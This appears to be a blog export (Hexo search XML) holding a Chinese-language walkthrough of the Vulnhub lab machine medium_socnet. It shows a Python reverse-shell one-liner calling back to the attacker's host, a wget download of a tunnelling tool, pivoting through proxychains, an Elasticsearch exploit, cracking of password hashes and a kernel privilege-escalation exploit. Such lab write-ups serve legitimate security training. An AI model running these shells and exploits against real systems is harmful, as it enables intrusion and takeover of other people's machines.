<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机之medium_socnet</title>
      <link href="/2022/03/13/medium_socnet/"/>
      <url>/2022/03/13/medium_socnet/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub靶机之medium-socnet"><a href="#Vulnhub靶机之medium-socnet" class="headerlink" title="Vulnhub靶机之medium_socnet"></a>Vulnhub靶机之medium_socnet</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描网段获取目标主机arp-scan -l</span><br></pre></td></tr></table></figure><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221214611944.png" alt="image-20220221214611944"  /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描目标主机端口及服务nmap -sS -sV -sC -p- 192.168.31.52</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221215333148.png" alt="image-20220221215333148"></p><p>目标系统为Ubuntu，开放22端口，5000端口为web服务，访问目标web</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221215803515.png" alt="image-20220221215803515"></p><p>一个留言版，测试了一下，不管输入什么都会显示出来，没有利用的地方</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221220826509.png" alt="image-20220221220826509"></p><p>扫一下目录        dirsearch -u <a href="http://192.168.31.52:5000/">http://192.168.31.52:5000/</a></p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221221012128.png" alt="image-20220221221012128"></p><p>访问admin目录</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221221202870.png" alt="image-20220221221202870"></p><p>一个代码测试框，结合前面信息搜集的结果可知使用的是python2.7，接下来就是用python2反弹shell</p><p>nc监听        nc -lvnp 123456</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221221449303.png" alt="image-20220221221449303"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python代码反弹shell</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.31.125&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221221752659.png" alt="image-20220221221752659"></p><p>直接root权限</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221221846953.png" alt="image-20220221221846953"></p><p>这就起飞了吗？？？当然不是</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221222004876.png" alt="image-20220221222004876"></p><p>ls看到Dockerfile，难道是在docker容器里，进一步排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221222232391.png" alt="image-20220221222232391"></p><p>宿主机，没有docker</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221222517767.png" alt="image-20220221222517767"></p><p>的确是在docker容器内，获取的也是docker容器shell，并不是宿主机的shell</p><p>信息搜集一波</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221224642303.png" alt="image-20220221224642303"></p><p>对外ip为：192.168.31.52        内网ip为：172.17.0.3        内网是否存在其它存活主机？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内网主机探测    for i in $(seq 1, 254); do ping -c 1 172.17.0.$i;done</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221223514650.png" alt="image-20220221223514650"></p><p>内网存活主机：172.17.0.1    172.17.0.2（已getshell）    172.17.0.3</p><p>扫描服务及端口，但外网没法访问到内网，搭建代理隧道，将getshell的172.17.0.2作为代理服务器，通过172.17.0.2去访问另外两台存活主机</p><p>使用venom搭建代理隧道</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221224908045.png" alt="image-20220221224908045"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python开启web服务python2 -m SimpleHTTPServer 8888</span><br><span class="line"></span><br><span class="line">  python3 -m http.server 8888</span><br><span class="line"></span><br><span class="line">目标主机获取文件 wget http://192.168.31.125:8888/a64</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221225242521.png" alt="image-20220221225242521"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本机监听端口./admin_linux_x64 -lport 5566</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221225553414.png" alt="image-20220221225553414"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赋予文件执行权限chmod u+x a64</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221225753235.png" alt="image-20220221225753235"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接远程主机./a64 -rhost 192.168.31.125 -rport 5566 </span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221230009736.png" alt="image-20220221230009736"></p><p>创建socks隧道</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221230235180.png" alt="image-20220221230235180"></p><p>配置proxychains</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221230438458.png" alt="image-20220221230438458"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221231156716.png" alt="image-20220221231156716"></p><p>也是开放22和5000端口，5000为web服务，浏览器代理访问一下</p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221231338051.png" alt="image-20220221231338051" style="zoom: 67%;" /><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221231438847.png" alt="image-20220221231438847" style="zoom: 50%;" /><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221231526588.png" alt="image-20220221231526588" style="zoom: 67%;" /><p>和目标机一摸一样。再看看172.17.0.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221232004616.png" alt="image-20220221232004616"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索Elasticsearch漏洞searchsploit Elasticsearch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221232122034.png" alt="image-20220221232122034"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径/usr/share/exploitdb/exploits/linux/remote/36337.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行expproxychains python 36337.py 172.17.0.3</span><br></pre></td></tr></table></figure><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221232740611.png" alt="image-20220221232740611" style="zoom: 67%;" /><p>获取到172.17.0.3 root权限，并且发现passwords文件夹</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221232906830.png" alt="image-20220221232906830"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">破解hash     https://www.somd5.com/</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221233106036.png" alt="image-20220221233106036"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh远程连接宿主机ssh john@192.168.31.52</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221233234098.png" alt="image-20220221233234098"></p><p>多次测试，仅john密码正确，能登录成功</p><p>Linux提权</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221233436972.png" alt="image-20220221233436972"></p><p>suid提权，没可利用的命令</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221233553193.png" alt="image-20220221233553193"></p><p>sudo提权也失败</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221233818971.png" alt="image-20220221233818971"></p><p>内核比较老，可尝试溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索提权expearchsploit linux 3.13</span><br></pre></td></tr></table></figure><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221234343683.png" alt="image-20220221234343683"></p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221234930500.png" alt="image-20220221234930500"></p><p>目标机没有安装gc，只能在本机上编译好再上传到目标机，但是查看exp发现代码还是需要调用gcc编译ofs-lib.c</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220221235051106.png" alt="image-20220221235051106"></p><p>删除exp中的调用ofs-lib.c这部分代码，执行编译，将编译后的文件同kali上编译好的ofs-lib.so一起上传目标执行</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220222000118866.png" alt="image-20220222000118866"></p><p>编译报错，不影响</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220222000235300.png" alt="image-20220222000235300"></p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220222000343939.png" alt="image-20220222000343939"></p><p>同样使用python开启web服务</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220222000715966.png" alt="image-20220222000715966"></p><p>将两个文件都移动到&#x2F;tmp目录下并赋予exp执行权限</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220222000957290.png" alt="image-20220222000957290">        </p><p>执行就可以获取root权限</p><p><img src="C:\Users\双耳红\AppData\Roaming\Typora\typora-user-images\image-20220222001033136.png" alt="image-20220222001033136"></p><p>总结</p><p>web扫目录发现&#x2F;admin  —-&gt;  python2代码测试反弹shell  —-&gt;  获取shell发现是docker容器  —-&gt;  内网探测发现其它主机  —-&gt;  venom scks代理  —-&gt;  Elasticsearch漏洞直接getshell  —-&gt;  发现passwords文件  —-&gt;  hash破解ssh远程登录  —-&gt;  溢出提权</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
